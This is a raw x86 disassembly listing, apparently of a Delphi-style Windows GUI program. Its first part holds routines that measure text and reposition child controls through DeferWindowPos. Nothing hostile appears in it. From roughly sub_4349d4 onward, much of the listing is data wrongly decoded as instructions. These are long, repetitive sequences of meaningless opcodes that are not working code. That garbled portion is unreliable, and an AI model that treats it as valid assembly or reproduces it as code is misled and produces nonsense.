sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_448740
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4340d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_450320
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_434104
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4509c0
pop esi
pop ebx
retn
sub_4342a8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_442324
mov edx edi
mov eax [ esi + 0x210 ]
call sub_4185a4
xor edx edx
mov eax edi
call sub_448ecc
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_449120
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_4346d8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_43432c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_41889c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_434364
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4343c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442624
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_4343ce
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469620
call sub_403970
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4343f4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_44e7bc
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403324
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_434434
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44e604
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403324
pop edx
pop esi
pop ebx
retn
sub_434460
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f968
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_434710
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4344f0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434784
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403128
mov eax [ esi + 0x210 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4514dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_434540
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_424280
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4346c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_44f7d8
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_448ecc
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_4489b0
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_418700
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403324
test al al
je r-xdata
sub_4346d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41875c
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_448bb8
mov eax ebx
mov si 0xffeb
call sub_403324
sub_434710
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_434888
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_434784
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4342a8
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_4187e8
call sub_403128
pop edi
pop esi
pop ebx
retn
sub_4347c4
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_434540
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4347fc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_418700
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418700
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_434888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_434951
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_434784
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_434540
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434958
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_418700
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418700
pop edx
call sub_448fdc
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_434960
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44ecc4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418700
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_4349d4
salc
dec eax
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] bl
salc
dec eax
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] al
salc
dec eax
add [ esi ] al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] cl
salc
dec eax
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ edx + edi * 4 + 0x4b440048 ] bl
inc ebx
add [ edx + edi * 4 + 0x4b3c0048 ] dl
inc ebx
add [ edx + edi * 4 + 0x4b340048 ] cl
inc ebx
add [ edx + edi * 4 + 0x4b2c0048 ] al
inc ebx
add [ edx + edi * 4 + 0x48 ] bh
add [ ebx + ecx * 2 ] ah
inc ebx
add [ edx + edi * 4 + 0x48 ] dh
add [ ebx + ecx * 2 ] bl
inc ebx
add [ edx + edi * 4 + 0x48 ] ch
add [ ebx + ecx * 2 ] dl
inc ebx
add [ edx + edi * 4 + 0x48 ] ah
add [ ebx + ecx * 2 ] cl
inc ebx
add [ edx + edi * 4 + 0x48 ] bl
add [ ebx + ecx * 2 ] al
inc ebx
add [ edx + edi * 4 + 0x48 ] dl
add ah bh
dec edx
inc ebx
add [ edx + edi * 4 + 0x48 ] cl
add ah dh
dec edx
inc ebx
add [ edx + edi * 4 + 0x48 ] al
add ah ch
dec edx
inc ebx
add [ edx + edi * 4 ] bh
dec eax
add ah ah
dec edx
inc ebx
add [ edx + edi * 4 ] dh
dec eax
add ah bl
dec edx
inc ebx
add [ edx + edi * 4 ] ch
dec eax
add ah dl
dec edx
inc ebx
add [ edx + edi * 4 ] ah
dec eax
add ah cl
dec edx
inc ebx
add [ edx + edi * 4 ] bl
dec eax
add ah al
dec edx
inc ebx
add [ edx + edi * 4 ] dl
dec eax
add [ edx + ecx * 2 - 0x45f3ffbd ] bh
dec eax
add [ edx + ecx * 2 - 0x45fbffbd ] dh
dec eax
add [ edx + ecx * 2 - 0x4603ffbd ] ch
dec eax
add [ edx + ecx * 2 - 0x460bffbd ] ah
dec eax
add [ edx + ecx * 2 - 0x4613ffbd ] bl
dec eax
add [ edx + ecx * 2 - 0x461bffbd ] dl
dec eax
add [ edx + ecx * 2 - 0x4623ffbd ] cl
dec eax
add [ edx + ecx * 2 - 0x462bffbd ] al
dec eax
add [ edx + ecx * 2 + 0x43 ] bh
add ah cl
mov ecx 0x4a740048
inc ebx
add ah al
mov ecx 0x4a6c0048
inc ebx
add [ ecx + edi * 4 + 0x4a640048 ] bh
inc ebx
add [ ecx + edi * 4 + 0x4a5c0048 ] dh
inc ebx
add [ ecx + edi * 4 + 0x4a540048 ] ch
inc ebx
add [ ecx + edi * 4 + 0x4a4c0048 ] ah
inc ebx
add [ ecx + edi * 4 + 0x4a440048 ] bl
inc ebx
add [ ecx + edi * 4 + 0x4a3c0048 ] dl
inc ebx
add [ ecx + edi * 4 + 0x4a340048 ] cl
inc ebx
add [ ecx + edi * 4 + 0x4a2c0048 ] al
inc ebx
add [ ecx + edi * 4 + 0x48 ] bh
add [ edx + ecx * 2 ] ah
inc ebx
add [ ecx + edi * 4 + 0x48 ] dh
add [ edx + ecx * 2 ] bl
inc ebx
add [ ecx + edi * 4 + 0x48 ] ch
add [ edx + ecx * 2 ] dl
inc ebx
add [ ecx + edi * 4 + 0x48 ] ah
add [ edx + ecx * 2 ] cl
inc ebx
add [ ecx + edi * 4 + 0x48 ] bl
add [ edx + ecx * 2 ] al
inc ebx
add [ ecx + edi * 4 + 0x48 ] dl
add ah bh
dec ecx
inc ebx
add [ ecx + edi * 4 + 0x48 ] cl
add ah dh
dec ecx
inc ebx
add [ ecx + edi * 4 + 0x48 ] al
add ah ch
dec ecx
inc ebx
add [ ecx + edi * 4 ] bh
dec eax
add ah ah
dec ecx
inc ebx
add [ ecx + edi * 4 ] dh
dec eax
add ah bl
dec ecx
inc ebx
add [ ecx + edi * 4 ] ch
dec eax
add ah dl
dec ecx
inc ebx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_434d04
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434d0b
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_40496c
sub_434d40
salc
dec eax
add al ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_434d6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434d74
retn
sub_434d80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434db1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434db8
retn
mov eax [ rw-data ]
call sub_403128
sub_434e4c
push eax
dec esi
inc ebx
add [ ebx ] al
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
inc bx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x54004215 ] ch
inc bx
add [ eax ] al
xchg esp eax
cmp al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi + 0x43 ] cs
add [ eax + eax ] ah
jne r-xdata
add [ esi ] dl
push esp
push ebx
jo r-xdata
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
inc ebp
add [ eax ] dl
jg r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
add [ eax + 0x7e ] cl
inc esp
add ah al
inc bx
add [ eax + 0x59 ] dh
inc ebp
add al al
jg r-xdata
add [ eax + 0x66 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x43 ] cl
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
inc esp
add [ ecx * 4 + 0x6cc80041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc edx
jne r-xdata
nop
add ah dh
inc bx
add [ eax ] dh
jg r-xdata
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
hlt
add [ edi + ecx * 2 + 0x240043 ] cl
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
inc esp
add ah dl
adc al 0x42
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
push eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1dffbcb0 ] al
push eax
inc ebx
add [ ecx + eax + 0x52840000 ] al
inc esp
add [ edi ] dl
inc ebx
add [ eax + eax * 4 + 0x44 ] al
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push 0x68676952
je r-xdata
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ edi ] dh
inc ebx
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al cl
add [ eax + eax + 0x34 ] 0x8a
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add [ eax ] ah
mov bl 0x44
add [ eax + 0x2c004494 ] al
xchg ebp eax
inc esp
add [ eax - 0x7b ] al
inc esp
add [ edx * 4 + 0x682c0044 ] cl
inc ebx
add [ eax ] dl
add [ ebx ] al
add cl [ eax + esi * 4 ]
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x434ff090
add [ eax ] al
add [ eax ] al
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add ah bl
adc eax 0x7ee80042
inc esp
add ah bl
xor [ eax ] al
test al 0x15
inc edx
add [ esi + 0x43 ] dl
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc edx
add al ch
jle r-xdata
je r-xdata
add [ eax ] dl
push ss
inc edx
outsb
jae r-xdata
adc [ eax + 0x40 ] ch
dec esi
inc ebx
add bl al
jmp sub_4038bc
shr [ esi + ecx * 2 + 0xa010043 ] 0x54
dec esi
jne r-xdata
add [ edi + edi * 2 + 0x15600044 ] dl
inc edi
insb
jns r-xdata
inc edx
add ah dh
adc eax 0x16480042
inc edx
add ah dl
jge r-xdata
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
adc [ edi + 0x43 ] cl
sub_4350a2
in al dx
jo r-xdata
inc edx
add [ ecx + esi * 2 ] cl
inc ebx
add [ eax + 0x71 ] al
inc ebx
add [ eax + 0x48004371 ] dh
jb r-xdata
popad
add [ eax ] al
je r-xdata
jo r-xdata
add [ eax + 0x72 ] dl
inc ebx
add [ eax + 0x72 ] bl
inc ebx
add [ edx + esi * 2 + 0x43 ] bh
add al dh
jb r-xdata
inc esp
outsb
nop
hlt
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
inc edx
jne r-xdata
inc esp
add [ edi ] ah
add [ edi ] al
add al ch
jae r-xdata
add [ eax ] eax
jmp [ edi + ebp * 2 + 0x10043 ]
cwde
push edi
inc ecx
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ 0x6e410700 ] cl
je r-xdata
add bh bh
jo r-xdata
je r-xdata
inc edx
jne r-xdata
pop es
add [ eax ] al
outsd
inc ebx
add ah ch
outsb
inc ebx
add ah dh
insb
inc ebx
add [ ebp + ebp * 2 + 0x43 ] cl
add ah ch
insd
inc ebx
add ah ah
outsb
inc ebx
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
add [ eax ] al
or eax 0x6e410700
add eax [ eax ]
outsb
add [ edi ] bl
outsb
jae r-xdata
add [ eax ] al
add [ eax + eax ] cl
jne r-xdata
inc edx
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
add [ eax + esi * 2 ] bh
inc ecx
add [ eax + eax ] bh
add dh bh
clc
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8465646f
aas
inc esp
add [ eax + eax ] dh
insb
insb
push ebp
jo r-xdata
inc eax
add [ edx + 0x1 ] dh
add bh bh
fdiv [ eax + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
sub_435103
dec edi
inc ebx
add [ eax + 0x53 ] bh
inc esp
add [ edi ] ah
add [ edi ] al
inc edx
jne r-xdata
add bh bh
jo r-xdata
je r-xdata
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
add [ edi ] bl
outsb
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
